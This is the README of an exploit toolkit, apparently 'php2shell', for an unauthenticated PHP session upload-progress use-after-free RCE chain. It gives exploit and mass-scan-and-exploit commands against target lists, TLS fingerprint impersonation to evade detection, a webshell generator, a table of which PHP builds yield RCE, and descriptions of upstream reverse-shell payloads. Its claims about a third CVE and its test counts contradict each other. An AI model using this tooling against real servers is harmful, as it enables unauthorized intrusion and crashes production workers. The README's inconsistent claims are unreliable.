<div align="center">

<img src="gambar/screenshot_1.png" alt="php2shell in action" width="720">

# 💀 P H P 2 S H E L L

### Unauthenticated RCE chain for PHP 5.4 → 8.4.26

*Pure HTTP · zero target-side requirements · JA3 fingerprint impersonation · proof-of-access design*

[![PHP](https://img.shields.io/badge/PHP-5.4%20→%208.4.26-777BB4?style=flat-square&logo=php&logoColor=white)](https://www.php.net)
[![CVSS](https://img.shields.io/badge/CVSS%204.0-9.2%20Critical-cb2431?style=flat-square)](https://www.first.org/cvss/)
[![Tests](https://img.shields.io/badge/tests-46%2F46-brightgreen?style=flat-square)](#-verification)
[![Platform](https://img.shields.io/badge/platform-Linux-blue?style=flat-square&logo=linux&logoColor=white)](#-the-5-lab-requirements)
[![License: GPL‑3.0](https://img.shields.io/badge/license-GPL--3.0-informational?style=flat-square)](LICENSE)
[![Docker](https://img.shields.io/badge/lab-docker%20one--command-2496ED?style=flat-square&logo=docker&logoColor=white)](#-one-command-lab)

[Install](#-install) · [Quick start](#-quick-start) · [Lab vs Live](#-lab-target-vs-live-target-baca-ini-sebelum-menjalankan) · [Modes](#-modes) · [Sumber repo](#-sumber-repo-bukan-fork-tapi-turunan-beberapa-repo) · [Kredit riset](#kredit-riset--siapa-menemukan-siapa-menuliskan) · [How it works](#-how-it-works) · [Stealth](#-stealth-anti-bot-detection) · [FAQ](#-faq) · [Disclaimer](#-disclaimer-authorized-use-only)

</div>

---

## ❖ What is this?

`php2shell` is a **reproduction and research toolkit** for two critical PHP
vulnerabilities — **CVE-2026-109619** and **CVE-2026-109618** (CVSS 4.0 **9.2
Critical**, unauthenticated, fixed in `8.2.35 / 8.3.36 / 8.4.27 / 8.5.12`).

It turns the bug into a **fully remote, HTTP-only exploit chain** against
`mod_php + Apache prefork` with **zero target-side requirements**:

- ❌ no `session_start()` needed on the target page
- ❌ no file upload feature needed
- ❌ no credentials, no cookie, no header trick
- ✅ the target page can be literally `<?php echo "OK\n"; ?>`

The toolkit is **proof-of-access by design**: commands are capped at 14 bytes,
limited to identity commands (`id`, `whoami`, …), `bash`/`nc`/`curl` are permanently
blocked, and evidence is retrieved automatically — it demonstrates impact
**without** being a drop-in backdoor.

---

## ❖ The bugs

| | CVE-2026-109619 | CVE-2026-109618 |
|---|---|---|
| **Class** | stale global state → UAF | OOM bailout corruption → longjmp |
| **Trigger** | `session.upload_progress` multipart callbacks run **before RINIT**; OOM leaves `PS(http_session_vars)` / `PS(id)` dangling → next request on the **same worker** calls `zval_ptr_dtor` on freed memory | `zend_bailout()` mid-allocation leaves half-built structures in global state |
| **Requests** | 2 (producer + consumer) | 1 |
| **Fix** | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 | same |
| **Status in this toolkit** | ✅ **implemented — full 0→RCE chain** | ⛔ intentionally not implemented (detect/preflight only) |

**Version semantics** — if your PHP is **below** the fix-floor, it is **vulnerable
and exploitable**; every release **from the fix-floor up** patches all of these
issues. PHP ≤ 8.1 is EOL: no backports, vulnerable forever.

| Branch | last vulnerable | fixed |
|---|---|---|
| 8.2 | 8.2.34 | 8.2.35 |
| 8.3 | 8.3.35 | 8.3.36 |
| 8.4 | **8.4.26** | **8.4.27** |
| 8.5 | 8.5.11 | 8.5.12 |
| ≤ 8.1 | all (EOL) | never |

Highest impact: **mod_php + prefork** (cross-request worker reuse).
php-fpm is a strong mitigation (worker dies per-request).
CDN-hidden versions? **Detection is information, not a gate** — preflight
reports what it can see and the chain proceeds anyway.

### Post-release advisory (verified 2026-10-24, primary sources)

- **Patches were rebuilt on 22 Oct 2026** — `8.5.12` and `8.4.27` carry
  ChangeLog entries dated 22 Oct (`Avoid state corruption via bailout`), but the
  version numbers did not change. The same `8.4.27` can mean the 21 Oct build
  (not final) or the 22 Oct build (final). **Check the package build date, not
  just the version string.**
- **A third CVE exists: `CVE-2026-115560`** (`Session upload progress`).
  Reserved, full advisory to follow in a regular release. It needs
  `session.serialize_handler` set to `php_binary`/`php_serialize` and switched
  to `php` at runtime via `ini_set()` before `session_start()`, plus
  `session.upload_progress.enabled=On`. Mitigate with
  `session.upload_progress.enabled=0`. Closed by the same fix-floor.
- **`memory_limit=-1` is NOT a complete mitigation** (GHSA-w8hw-w9fx-j79w).
  If a base allocation fails, `longjmp()` can still happen while request memory
  is reachable. Only upgrading is complete.
- **`session.upload_progress.enabled=0` only closes 109618 (+115560). It does
  not close 109619.**
- **In-the-wild exploitation predates the patch:** first attempts 17 Oct 2026,
  four days before release, from anonymized/VPN IPs against honeypots
  (Amazon Threat Intelligence). No confirmed successful compromise is public
  as of 2026-10-23.

Run `php2shell version --advisories` for this list from the CLI.

---

## ❖ Install

```bash
git clone https://github.com/aarsaputra/php2shell.git
cd php2shell
bash install.sh        # venv + deps + smoke-tests + global `php2shell` command
```

<details>
<summary>Manual install (no installer)</summary>

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt     # curl_cffi (JA3) + bcrypt (webshell mode)
python php2shell.py --help
```

</details>

Every dependency and why it exists: **[REQUIREMENTS.md](REQUIREMENTS.md)**.

---

## ❖ One-command lab

The repo ships the **author's exact vulnerable lab configuration** — reproducing
the research environment is one command, not an afternoon:

```bash
bash lab/lab_docker.sh start
# → pulls official php:8.4.26-apache
# → mounts docker/php.ini + docker/apache.conf + docker/www (author's config)
# → single prefork worker, KeepAlive Off, upload_progress tuned
# → http://127.0.0.1:8095/index.php
```

---

## ❖ Quick start

```bash
# 0) fresh binary offsets (required after every imagechange)
python3 docker/offsets.py          # → out/offsets.env

# 1) run the chain with automatic proof retrieval
php2shell exploit \
    -u http://127.0.0.1:8095/index.php --force --yes \
    --exploit-profile bookworm -c 'id>/out/p1'
```

```text
 ____  _   _ ____ ____  ____  _   _ _____ _     _
|  _ \| | | |  _ \___ \/ ___|| | | | ____| |   | |
| |_) | |_| | |_) |__) \___ \| |_| |  _| | |   | |
|  __/|  _  |  __// __/ ___) |  _  | |___| |___| |___
|_|   |_| |_|_|  |_____|____/|_| |_|_____|_____|_____|
  P H P 2 S H E L L  v1.3.0  -  toolkit terpadu
  ----------------------------------------------------------------
  diuji: CVE-2026-109619 (rantai penuh)   deteksi: CVE-2026-109618 (rantai beda, tidak dijalankan)
  fix-floor: 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12
  terakhir rentan: 8.2.34 / 8.3.35 / 8.4.26 / 8.5.11
  ----------------------------------------------------------------
  stealth: curl_cffi JA3 impersonate
  ----------------------------------------------------------------

  mode       : scan  |  detect  |  preflight  |  exploit  |  shell  |  version
  cepat      : php2shell.py scan -l targets.txt
  bantuan    : php2shell.py --help

  pagar & peringatan: php2shell.py --help  |  rincian: README.md
```

*(persis banner yang dicetak CLI saat dijalankan — sumber: `lib/banner.py`)*

---

## ❖ Lab target vs Live target — baca ini sebelum menjalankan

Dua skenario berbeda, dan **command-nya beda**:

### A) Lab lokal (`127.0.0.1`) — full proof

```bash
php2shell exploit -u http://127.0.0.1:8095/index.php --force --yes \
    --exploit-profile bookworm -c 'id>/out/p1'
# → PROOF (8.3s): uid=33(www-data)   ← hasil perintah TERBACA otomatis
```

Kenapa bisa terbaca? `id>/out/p1` menulis hasil `id` ke file `/out/p1` di
dalam container, dan folder itu **di-mount ke host** (`out/p1`). Toolkit
otomatis membacanya → kamu lihat `uid=33(www-data)` di terminal.

### B) Live target (website aktif) — blind by design

```bash
php2shell exploit -u https://target.example/ --yes -c 'id'
# → stage 1/2/3 selesai, tapi:
# → BLIND — perintah terkirim, tapi tidak ada kanal bukti
```

Di live target **`id>/out/p1` TIDAK berguna** — folder `/out` di server
target tidak di-mount ke mesinmu, jadi tidak ada yang bisa dibaca. Hasilnya
`BLIND`: rantai *dieksekusi* (worker mati + restart = jejak jelas di log
server), tapi output perintah tidak sampai ke kamu.

**Itu keputusan desain, bukan kekurangan:** repot-repot buat "kanal baca
output" di live target = membuat tool ekstraksi data = melintasi garis
proof-of-access → backdoor. Toolkit ini sengaja berhenti di bukti *eksekusi*
(worker crash pattern + stage 3 selesai), bukan bukti *output perintah*.

**Alur kerja yang disarankan di live target:**

```bash
# 1) RECON dulu — tanpa menyentuh exploit:
php2shell detect    -u https://target.example/
php2shell preflight -u https://target.example/
# verdict: vulnerable / patched / unknown (CDN) + skor kesiapan

# 2) Cek upload_progress & display_errors bocor atau tidak:
#    kalau CDN menutup versi → tetap boleh lanjut (deteksi bukan gerbang)

# 3) Eksploitasi (kalau target MILIKMU / ada izin):
php2shell exploit -u https://target.example/ --yes -c 'id'
# hasil BLIND = dieksekusi tapi output tak terbaca
# bukti dampak: worker crash di log server + stage-3 completion
```

> ⚠️ **Sadar risiko di live target:** setiap percobaan membuat 1 worker
> Apache **mati (SIGABRT)** lalu di-fork ulang. Di server produksi itu =
> gangguan layanan + jejak log yang sangat jelas + kemungkinan WAF block.
> Sekali coba sudah cukup untuk membuktikan — loop retry 3×3 hanya untuk lab.

---

## ❖ Modes

### `scan -l targets.txt` — banyak target sekaligus

```bash
php2shell.py scan -l targets.txt                     # detect + preflight semua
php2shell.py scan -l targets.txt --exploit --yes     # + exploit yang READY saja
php2shell.py scan -l targets.txt --threads 10        # paralel
php2shell.py scan -l targets.txt --json out/r.json --csv out/r.csv
```

Format file: satu URL/baris, `#` komentar, duplikat dibuang (case & trailing
slash dianggap sama), baris tanpa `://` otomatis `https://`.
Hasil: tabel terminal + JSON + CSV (verdict, versi, skor, ready, proof).

### `detect -u URL` — intip versi (read-only, tidak menyerang)

```bash
php2shell.py detect -u https://target.example/
```
Membaca: versi PHP (header/X-Powered-By/error page), branch & fix-floor
verdict (vulnerable/patched/EOL), status `session.upload_progress`,
status `display_errors`. Zaranya GET biasa.

**Deteksi aktif OOM (baru, v1.4.0)** — otomatis menyala bila verdict
masih `unknown`/`eol` setelah probe pasif (versi PHP disembunyikan CDN
atau target EOL). Metodologi mengikuti
[assetnote/php2shell-scanner](https://github.com/assetnote/php2shell-scanner):
control request + tiga probe multipart dengan array-key nested-62 level
(1 → 8 → 20 MiB). Verdict `vulnerable` bila muncul salah satu:
- fatal `Allowed memory size ... in Unknown` (OOM di dalam parser
  multipart), atau
- differential empty HTTP 500 (worker FPM mati di tengah), atau
- 502/503/504 (worker abort di belakang front).

Perlindungan false-positive: warning `POST Content-Length exceeds the
limit` (lokasi juga `Unknown`, tapi itu post_max_size guard — bukan bug)
TIDAK dihitung sebagai sinyal.

```bash
php2shell.py detect -u https://target.example/          # OOM otomatis (bila unknown/eol)
php2shell.py detect -u https://target.example/ --no-oom  # matikan OOM probe
```
Catatan: bila `memory_limit` target > 20 MiB, OOM tidak tercapai →
verdict tetap `inconclusive` dengan alasan eksplisit (bukan "not
vulnerable"). Target dengan versi terbaca >= fix-floor tidak pernah
diprobe OOM (hemat dan minim jejak).

### `preflight -u URL` — skor kesiapan + blocker

```bash
php2shell.py preflight -u https://target.example/
```
Skor 0–90 dari: versi rentan (30), upload_progress On (30), display_errors
On (15), versi dikenali (15). **Filosofi: deteksi = informasi, bukan gerbang** —
versi tersembunyi CDN tetap lanjut; blocker keras cuma 2: server mati, atau
versi TERBACA sudah-patch.

### `exploit -u URL` — rantai penuh

```bash
# lab lokal (mount /out) → hasil perintah TERBACA:
php2shell.py exploit -u http://127.0.0.1:8095/index.php --force --yes \
    --exploit-profile bookworm -c 'id>/out/p1'

# live target → BLIND (perintah jalan, output tak terbaca — by design):
php2shell.py exploit -u https://target.example/ --yes -c 'id'
```
Opsi penting:
| Flag | Fungsi |
|---|---|
| `-c / --cmd` | perintah proof, maks 14 byte; default `id` |
| `--allow-cmd CMD` | tambah whitelist (ls/cat/df/uname/dll) — berulang |
| `--exploit-profile {bookworm,lab}` | set offset bawaan (bookworm = image resmi) |
| `--zif-offset / --dtor-offset / --htdata-offset` | offset manual utk build lain |
| `--retries N` | retry per stage (default 3, heap-fresh via rotasi worker) |
| `--huge-mb N` | paksa ukuran field OOM stage-1 (default: dibaca dari `memory_limit`) |
| `--force` | paksa lewat preflight TIDAK-READY (tetap konfirmasi) |
| `--exploit-timeout N` | batas waktu total rantai (default 300s) |

#### Kenapa `--huge-mb` sekarang otomatis

Stage 1 mengirim satu field multipart yang **harus lebih besar** dari
`memory_limit` target — itulah pemicu OOM-nya. Dulu nilainya dipaku 12 MB,
dan akibatnya berbeda-beda tergantung target:

| `memory_limit` target | 12 MB hardcoded | sekarang |
|---|---|---|
| 8 M | OOM, rantai jalan | baca 8 M → kirim 10 MB |
| 128 M | **tidak OOM**, rantai mati tanpa sebab jelas | baca 128 M → kirim 147 MB |
| 512 M | **tidak OOM**, dan 12 MB terkirim sia-sia | berhenti + peringatan |

Kegagalan di baris kedua dan ketiga terlihat identik dari luar ("stage1
gagal"), padahal penyebabnya beda. Sekarang `exploit` mengirim **satu**
request probe lebih dulu, membaca angka dari pesan fatal PHP
(`Allowed memory size of N bytes exhausted`), lalu menyetel field-nya
sedikit di atas limit.

Yang **tidak** dilakukan tool ini: menaikkan ukuran sampai berhasil.
Kalau angkanya tidak terbaca (`display_errors=Off`), ia memakai default 12 MB
dan mengatakan demikian — tidak menyapu 256 MB ke target orang untuk
menebak. Kalau `memory_limit` di atas 512 MB, ia berhenti dan melapor,
karena rantai ini memang tidak akan jalan di sana.

#### Syarat target yang benar-benar menentukan

Rantai gagal di stage 1 bukan karena jumlah worker Apache, melainkan karena
**request tidak pernah sampai utuh ke PHP**. Kalau `post_max_size` lebih
kecil dari body stage-1, PHP membuang body itu sebelum skrip jalan — dan
di luar kegagalannya identik dengan "target tidak rentan".

| Setelan | Syarat | Kenapa |
|---|---|---|
| `post_max_size` | ≥ 64M | body stage-1 lebih besar dari `memory_limit`; kalau ini lebih kecil, body dibuang mentah-mentah |
| `upload_max_filesize` | ≥ 64M | batas per-file untuk field multipart |

`exploit` sekarang membedakan keduanya dan berhenti dalam ~2 detik dengan
alasan yang benar:

```
[*] body 16 MB ditolak target sebelum skrip jalan — post_max_size terlalu kecil untuk stage-1
     gagal (0.0s): target menolak body stage-1 sebelum PHP menjalankan skrip ...
```

Klaim populer "butuh 150 worker, sisakan 1" (dari `9bie`) **tidak terbukti**
saat diuji ulang: rantai jalan dengan 1 worker maupun 150 worker. Angka 150
ternyata hanya bawaan `mpm_prefork.conf` stock. Percobaan lengkapnya ada di
[`docs/SYARAT_TARGET.md`](docs/SYARAT_TARGET.md).

```console
$ php2shell.py exploit -u http://target/index.php -c 'id>/out/p1'
[*] memory_limit 8 MiB terbaca dari target; field 'big' disetel 10 MB (harus > limit)
     stage 1: heap leak (percobaan 1/3)
     PROOF (7.7s): uid=33(www-data) gid=33(www-data)
```

### `shell` — generator webshell berpassword

```bash
php2shell.py shell --out shell/out --ttl 72
```
Menghasilkan file PHP (nama 32-hex) + `CREDENTIALS.txt` (bcrypt, TIDAK
disimpan di shell). Fitur: password bcrypt, whitelist perintah per shell,
TTL kedaluwarsa, rate limit. **Generator saja — tidak meng-upload.**
Uji lokal: `php -l <file>` lalu `php -S 127.0.0.1:8099`.

### `version` — cek versi otomatis

```bash
php2shell.py version                  # bandingkan dengan rilis publik di GitHub
php2shell.py version --no-cache       # abaikan cache 1 jam
php2shell.py version --json out/v.json
php2shell.py detect -u https://t/ --check-version   # cek dulu, lalu lanjut
```

Sumber pembanding (berurutan, gagal-aman):

| Urutan | Sumber | Keterangan |
|---|---|---|
| 1 | `releases/latest` | tag rilis GitHub (kalau sudah ada rilis) |
| 2 | `/tags` | tag tertinggi, diurutkan numerik (bukan leksikal) |
| 3 | `VERSION` di branch `main` | fallback selama repo belum punya tag |

Perilaku:

- **Gagal-aman**: offline, DNS mati, GitHub rate-limit, repo 404 → status
  `unknown` + alasan. Tidak pernah crash, tidak pernah menggagalkan mode utama.
- **Semver numerik**: `1.10` dianggap lebih baru dari `1.2` (bukan string compare).
- **Cache 1 jam** di `out/version-check.json` supaya tidak kena rate-limit GitHub.
- **Tanpa telemetry**: hanya GET ke GitHub, tidak mengirim data apa pun.
- **Exit code**: `0` = terbaru / tidak bisa dicek, `10` = ada update (bisa dipakai
  sebagai gate CI).

```
[OK]   lokal   : 1.3.0
      remote  : 1.3.0  (sumber: branch)
      status  : current
      pesan   : php2shell 1.3.0 — sudah versi terbaru
      repo    : https://github.com/aarsaputra/php2shell
```

### `builds` — build mana yang benar-benar bisa di-RCE

Ini menjawab pertanyaan yang paling sering salah dijawab: **"target ini bisa
di-RCE atau cuma bisa dibocorkan?"** Sebelum versi 1.3.0, `preflight` memberi
`READY` untuk build apa pun yang lolos cek versi — padahal PHP 8.3.x terbukti
hanya bisa sampai stage leak.

```bash
php2shell.py builds                 # seluruh tabel
php2shell.py builds --level rce     # hanya yang RCE-nya terbukti
php2shell.py builds --json out/b.json
```

```
  PHP       arch      dukungan  catatan
  8.5.11    amd64     RCE       separate offsets, same htdata
  8.5.11    aarch64   RCE       uid=33(www-data)
  8.5.10    aarch64   RCE       uid=33(www-data)
  8.4.26    amd64     RCE       build referensi lab kita; RCE terbukti disini
  8.4.25    aarch64   RCE       stage 3 probabilistik — butuh retry
  8.5.0     any       LEAK      stage-3 layout tidak ditemukan
  8.3.35    aarch64   LEAK      stage-3 reference hidup, RCE tidak
  8.3.33    amd64     LEAK      wordpress:7.1.1-apache mod_php
  8.3.0     aarch64   NO        PS(id) dangling; cookie tidak reclaimed
  8.2.34    aarch64   NO        UAF ada; bentuk leak berbeda
  8.1.34    aarch64   NO        UAF ada; bentuk leak berbeda
  8.0.30    aarch64   NO        UAF ada; bentuk leak berbeda
  7.4.33    aarch64   NO        UAF ada; bentuk leak berbeda

  total 13 build: 5 RCE, 3 leak-saja, 5 belum terbukti
```

Arti kolom `dukungan`:

| Nilai | Arti | Yang terjadi saat exploit |
|---|---|---|
| `RCE` | stage 1+2+3 terbukti di build persis itu | perintah benar-benar dieksekusi, `PROOF` muncul |
| `LEAK` | stage 1+2 terbukti, stage 3 tidak | berhenti setelah bocoran alamat; perintah **tidak** dieksekusi |
| `NO` | belum pernah terbukti bisa dilanjutkan | kemungkinan berhenti di stage 1-2 |
| `?` | build tidak ada di tabel | dicoba dengan offset default; anggap belum pasti |

Tabel ini juga muncul otomatis di `preflight` sebagai baris `dukungan :` dan di
kolom ke-3 tabel `scan`/`detect` — jadi keputusan tembak diambil **sebelum**
rantai dijalankan, bukan setelah menunggu 200 detik kegagalan.

Dua hal yang perlu ditegaskan:

- **Arsitektur menentukan.** `8.4.26` RCE di `amd64`, tapi hanya `LEAK` di
  `aarch64`. Kalau arsitektur target tidak terbaca, tool memakai entri RCE
  sebagai perkiraan — dengan catatan bahwa arsitektur menentukan hasil.
- **`NO` bukan "mustahil".** Itu kata penulis tabel aslinya, dan kita ikut
  apa adanya. Offset bisa dipasok manual lewat `--zif-offset` / `--dtor-offset`.
  Kalau kamu punya build yang tidak ada di tabel tapi RCE-nya jalan, itu temuan
  baru — bukan kesalahan tabel.

Sumber tabel: `devploit/php2shell` (13 profil heap, 5 RCE terverifikasi),
`9bie/php2shell-bypass-aslr-exp` (worker pinning di stock image), dan lab kita
sendiri (`php:8.4.26-apache`). Tidak ada angka yang dikarang.

### Flag global (berlaku semua mode)

| Flag | Fungsi |
|---|---|
| `--ja3 {chrome,safari,firefox,edge,android}` | profil TLS+UA browser (default chrome) |
| `--delay N` | jeda antar request + jitter (default 1.0s; jitter 0.75–1.35×) |
| `--timeout N` | timeout HTTP per request (default 15s) |
| `--proxy URL` | lewat proxy, mis. `http://127.0.0.1:8080` |
| `--audit FILE` | catat SEMUA request ke JSONL (bukti + troubleshooting) |
| `--no-upload-progress` | skip probe upload_progress saat detect |
| `--no-display-errors` | skip probe display_errors saat detect |
| `--json / --csv` | output file laporan |
| `-v, --verbose` | tampilkan tiap request (status, durasi, ukuran body, error) |

### Flag lanjutan (scan & exploit)

| Flag | Fungsi |
|---|---|
| `--quiet` | perkecil output rantai (kebalikan `-v`) |
| `--cve {CVE-2026-109619}` | pilih CVE yang ditembak (hanya 109619; nilai lain ditolak — 109618 tidak diimplementasikan) |
| `--fetch URL` | URL yang di-fetch lewat RCE setelah eksekusi (kanal baca hasil) |
| `--proof-file NAME` | bentuk `-c 'id>/out/NAME'` lalu bacakan hasilnya (nama `[A-Za-z0-9_-]{1,24}`; kanal bukti) |
| `--output-file FILE` | tulis output mentah rantai ke file |
| `--offsets-file FILE` | pakai profil offset dari file; `''` = jangan pakai profil lab |
| `--no-auto-offsets` | jangan cari offset otomatis (paksa pakai `--zif-offset`/`--dtor-offset`) |
| `--no-pre-rotate` | jangan rotate worker sebelum preflight |
| `--no-retry-rotate` | jangan rotate worker saat retry |

### Flag mode `detect` / `preflight`

| Flag | Fungsi |
|---|---|
| `-u, --urls URL [URL ...]` | satu atau lebih URL langsung |
| `-l, --list FILE` | atau baca daftar URL dari file `.txt` |

### Flag mode `shell`

| Flag | Fungsi |
|---|---|
| `--out DIR` | folder keluaran webshell (default `shell/`) |
| `--ttl JAM` | masa berlaku webshell dalam jam (default 72) |
| `--commands "a,b,c"` | whitelist perintah di webshell (default `id,whoami`) |
| `--author NAMA` | tanda tangan author di header webshell |
| `--purpose TEKS` | keterangan tujuan di header webshell |

---

## ❖ Sumber repo — bukan fork, tapi turunan beberapa repo

Repo ini **bukan fork**. Tidak ada satu repo pun yang bisa di-fork lalu jadi
php2shell, karena bahannya diambil dari **empat sumber berbeda** (tiga repo
publik + dua advisori resmi). Karena itu sumbernya dicantumkan satu per satu
di sini, bukan lewat mekanisme "forked from".

### Repo yang diambil

| # | Repo | Penulis | Yang diambil dari sini | Lisensi |
|---|---|---|---|---|
| 1 | `https://github.com/9bie/php2shell-bypass-aslr-exp` | **9bie (Qi Deng)** | **Rantai inti**: 2-request `session.upload_progress` UAF (CVE-2026-109619), ASLR bypass lewat heap + `libphp` base leak, aktuator `pDestructor = zif_system`. `lib/chain.py` = port logikanya jadi modul in-process. | tidak ada file lisensi (hak cipta default) |
| 2 | `https://github.com/Zer061/CVE-2026-109618` | **Zer061** (+ v.dir.mir, 9bie) | Fork tempat `exploit.py` acuan byte-level kami diambil (sha256 `ea925683…`). Riwayatnya campuran: `adc5f9b` oleh 9bie, `5fc5669` oleh v.dir.mir (**menambah `--revshell`**), `4752adc` oleh Zer061. **Sudah di-takedown GitHub.** | tidak ada file lisensi |
| 3 | `https://github.com/ikow/php2shell-poc` | **ikow** | Verifikator crash CVE-2026-109618 (`poc/verify_oom_trigger.py`). | dirujuk, tidak di-vendor |
| 4 | `curl_cffi` — `https://github.com/lexiforest/curl_cffi` | lexiforest / yifeikong | JA3/TLS impersonation di `lib/transport.py`. | MIT (dependency) |

### Dua repo pembanding (dibaca, tidak di-vendor)

Dua repo ini **tidak** kami ambil kodenya — dibaca untuk pembanding, dan satu
di antaranya menyumbang **data** yang kami adopsi (tabel dukungan build).
Disebut di sini supaya jelas mana yang kode dan mana yang pengukuran.

| Repo | Yang kami ambil | Yang TIDAK kami ambil |
|---|---|---|
| `https://github.com/devploit/php2shell` (devploit, MIT) | **Tabel 13 profil heap** → `lib/build_support.py`: build mana yang RCE, mana yang cuma leak, per arsitektur. Ini pengukuran mereka, dan mereka dikreditkan di header modul. | Kode. Juga **tidak** kami ikut menyebut `CVE-2026-115560` — nomor itu tidak ada di MITRE/NVD/daftar advisori `php/php-src`. |
| `https://github.com/murrez/php2shell` (murrez, MIT) | Tidak ada yang diadopsi ke kode. | Kode. `poc.py` 4.411 baris tidak di-vendor; klaim `CVE-2026-115560` sebagai "headline" tidak kami ulang. |

Yang menarik dari `devploit` dan kami catat di `ATTRIBUTION.md`: mereka
menyelesaikan masalah lisensi 9bie dengan cara **tidak** menyalin kode sama
sekali — `bootstrap_upstream.py` hanya meng-clone commit tertentu saat runtime.
Kami tidak bisa memakai jalan itu (mesin rantai harus jalan offline), tapi
polanya benar.

### Advisori & data resmi

| Sumber | Yang diambil |
|---|---|
| `GHSA-w8hw-w9fx-j79w` (PHP Group) | CVE-2026-109618 — OOM dalam `session.upload_progress` |
| `GHSA-6wmf-4rv5-p3rp` (PHP Group) | CVE-2026-109619 — UAF di `php_session_initialize()` |
| php.net changelog 8.4.27 | fix-floor 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 |

### Kredit riset — siapa menemukan, siapa menuliskan

Tool ini **tidak mengklaim penemuan CVE**. Yang menemukan adalah **Wiz
Research**, dan itu harus disebut lebih dulu sebelum nama-nama yang menulis
kode.

| Nama | Peran |
|---|---|
| **Wiz Research** | Penemu dan analis publik PHP2Shell (CVE-2026-109618 / CVE-2026-109619) — [blog](https://www.wiz.io/blog/php2shell-php-rce). Semua yang ada di repo ini bermula dari publikasi itu. |
| **Calif** | Riset paralel, analisis amplifikasi metadata upload ([calif.io](https://calif.io/research/wp2root)). |
| **9bie (Qi Deng)** | Exploit publik pertama + riset heap grooming: leak stage-1/2, carrier fake HashTable stage-3. Rantai di `lib/chain.py` adalah port logikanya. |
| **Karasawa2025** | Arah `display_errors=Off` — primitif OOM-di-cookie dan strategi leak alternatif. |
| **v.dir.mir** | Menambahkan `--revshell` pada `exploit.py` acuan (commit `5fc5669`). Fitur itu **tidak** kami port. |
| **Zer061** | Fork tempat `exploit.py` acuan byte-level kami diambil (sha256 `ea925683…`). |
| **ikow** | Verifikator OOM CVE-2026-109618 (`poc/verify_oom_trigger.py`). |
| **devploit** | Tabel 13 profil heap → `lib/build_support.py`, dan pola lisensi `bootstrap_upstream.py`. |
| **Assetnote / Searchlight Cyber** (Shubham Shah, Adam Kues, Patrik Grobshäuser) | Metodologi deteksi aktif pada [`assetnote/php2shell-scanner`](https://github.com/assetnote/php2shell-scanner) + [write-up Searchlight](https://www.slcyber.io/research/high-fidelity-detection-mechanism-for-php2shell-cve-2026-109618-and-cve-2026-109619): probe OOM bertingkat 1/8/20 MiB dengan kunci nested-62, sinyal `fatal-in-parser`/`empty-500-differential`/`worker-abort`, dan catering `memory_limit` false-positive → diadopsi menjadi `lib/oomprobe.py` (mode `detect` otomatis; `--no-oom` untuk menonaktifkan). |
| **calif.io** | [Write-up asli php2shell](https://calif.io/php2shell/) pertama yang merinci kondisi exploitasi mod_php & php-fpm — dirujuk oleh scanner assetnote sebagai basis triase. |
| **PHP Group** | Advisori + perbaikan di 8.4.27 / 8.5.12. |

Kalau ada kredit yang kurang atau keliru, buka issue — itu kalimat devploit,
dan kami ikut memakainya karena memang begitu seharusnya.

Yang sengaja **tidak** dikutip: `WoYinDao` (disebut devploit, tapi tidak ada
jejak publik yang bisa kami verifikasi) dan `CVE-2026-115560` (404 di MITRE,
0 hasil di NVD) — nomor itu dipakai `murrez` sebagai headline, dan tidak kami
ulang.

### Kenapa tidak bisa di-fork

Fork = satu garis keturunan git. Di sini:

- rantai eksploitasi datang dari **9bie** (repo 1), tapi build-nya `exploit.py`
  kami ambil dari **fork Zer061** (repo 2) yang riwayatnya sendiri campuran
  tiga penulis;
- verifikasi kerentanan CVE-2026-109618 dari **ikow** (repo 3);
- semantik versi & fix-floor dari **advisori PHP Group** (bukan repo);

Tidak ada satu pun dari mereka yang bisa jadi "parent" tunggal. Yang kami tulis
sendiri: CLI 7 mode, engine in-process `lib/chain.py`, auto-proof baca `out/p1`,
pagar perintah, skor preflight, mode stealth, 81 unit test, installer, lab Docker.

### Kenapa `--revshell` tidak ada di sini

`exploit.py` acuan kami (sha256 `ea925683…`, dari repo 2) **mengandung reverse
shell** yang ditambahkan commit `5fc5669` oleh **v.dir.mir**:

- payload `bash` lewat `/dev/tcp/{ip}/{port}`
- payload `python3` pty spawn
- payload `perl` socket exec
- listener `nc` yang menyerahkan shell interaktif

Ini fitur terdokumentasi, **bukan trojan tersembunyi** — tapi ini juga alasan
sah GitHub men-takedown repo asalnya. Kami tidak mengadopsinya:

| Upstream | php2shell |
|---|---|
| `--revshell IP:PORT` | **tidak terdaftar di argparse** |
| payload `bash`/`python`/`perl` | tidak bisa dikirim (batas 14 byte + whitelist) |
| `sh</out/c` | `<` dan `>` ditolak sebagai operator |
| listener `nc` | **tidak diimplementasikan** |

### Hasil audit forensik — SELURUH riwayat git (2026-10-24)

Bukan hanya working tree: **semua 384 blob dari 19 commit** diekstrak dan
dipindai. Laporan penuh: `AUDIT_FORENSIK_Zer061_2026-10-24.md` (SSD lab).

| Pemeriksaan | Hasil |
|---|---|
| C2 / host eksternal hardcoded | **tidak ada** — hanya `hub.docker.com` di README, `127.0.0.1`, `localhost` |
| Pencurian kredensial (`~/.ssh`, `.aws`, `/etc/shadow`, `.netrc`) | **tidak ada** |
| Persistence (`crontab`, `systemd`, `rc.local`, autostart) | **tidak ada** |
| Obfuscation (`b64decode`, hex blob, `chr()` chain, keylogger) | **tidak ada** — `\x..` = byte array protokol |
| Binary tak dikenal | **tidak ada** — hanya `php-8.4.26.tar.gz` resmi + 1 PNG |
| `scp` ke host luar | **tidak ada** — hanya `172.16.1.112` (RFC1918, VM lab penulis) |
| **`--revshell` + payload + listener `nc`** | **ADA di source acuan** — **diblokir total di sini** |

Kata "pristine" di dokumen lama artinya **tidak diubah oleh kami**, bukan
**tidak berbahaya**. Kalau kamu fork repo ini, **diff dulu sebelum percaya** —
aturan yang sama kami pakai ke upstream.

---

## ❖ How it works

```text
┌──────────────┐   ① 12MB multipart → OOM inside
│   REQUEST A  │      php_session_initialize()
│  (producer)  │      → PS(http_session_vars) dangles
│              │      → Apache prefork worker dies (SIGABRT)
└──────────────┘
┌──────────────┐   ② prefork forks a fresh worker that INHERITS
│   REQUEST B  │      the same libphp mapping & heap layout
│ (consumer)   │      → re-occupies the dangling reference with
│              │      attacker-sized multipart buffers
└──────────────┘
       │
       ▼   ③ fake HashTable whose pDestructor = zif_system
┌──────────────────────────────────────────────┐
│  php_session_track_init()                    │
│    → zval_ptr_dtor(PS(http_session_vars))    │
